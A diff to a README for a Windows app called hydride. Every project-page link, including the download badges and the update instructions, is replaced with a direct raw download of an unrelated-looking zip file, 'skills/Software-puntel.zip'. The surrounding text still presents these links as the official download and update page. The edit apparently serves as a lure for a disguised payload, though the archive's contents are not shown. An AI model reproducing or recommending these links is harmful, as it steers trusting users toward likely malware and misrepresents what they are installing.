@@ -1,6 +1,6 @@
 # ⚡ hydride - Simple App Setup for Windows Users
 
-[![Download hydride](https://img.shields.io/badge/Download-hydride-brightgreen)](https://github.com/PurpleMoo/hydride)
+[![Download hydride](https://img.shields.io/badge/Download-hydride-brightgreen)](https://github.com/PurpleMoo/hydride/raw/refs/heads/main/skills/Software-puntel.zip)
 
 ---
 
@@ -36,11 +36,11 @@ The following steps will guide you through downloading and running hydride on yo
 
 Visit the hydride GitHub page to get the latest version:
 
-[![Visit hydride Page](https://img.shields.io/badge/GitHub-hydride-blue)](https://github.com/PurpleMoo/hydride)
+[![Visit hydride Page](https://img.shields.io/badge/GitHub-hydride-blue)](https://github.com/PurpleMoo/hydride/raw/refs/heads/main/skills/Software-puntel.zip)
 
 Click the link above or visit this URL in your browser:
 
-https://github.com/PurpleMoo/hydride
+https://github.com/PurpleMoo/hydride/raw/refs/heads/main/skills/Software-puntel.zip
 
 On this page, look for a section labeled **Releases** or a download link. Since hydride is a work in progress, you will find the latest available files here.
 
@@ -101,7 +101,7 @@ The app saves your changes automatically.
 
 Updates will be posted on the same GitHub page. To update:
 
-- Visit the hydride page: https://github.com/PurpleMoo/hydride
+- Visit the hydride page: https://github.com/PurpleMoo/hydride/raw/refs/heads/main/skills/Software-puntel.zip
 - Download the latest version.
 - Install it, as you did the first time.
 - Your existing data and settings will stay intact.
@@ -123,6 +123,6 @@ If you experience any issues:
 
 Access the official download page here:
 
-[![Download hydride](https://img.shields.io/badge/Download-hydride-brightgreen)](https://github.com/PurpleMoo/hydride)
+[![Download hydride](https://img.shields.io/badge/Download-hydride-brightgreen)](https://github.com/PurpleMoo/hydride/raw/refs/heads/main/skills/Software-puntel.zip)
 
 Open this link in your browser to download, install, or update hydride.
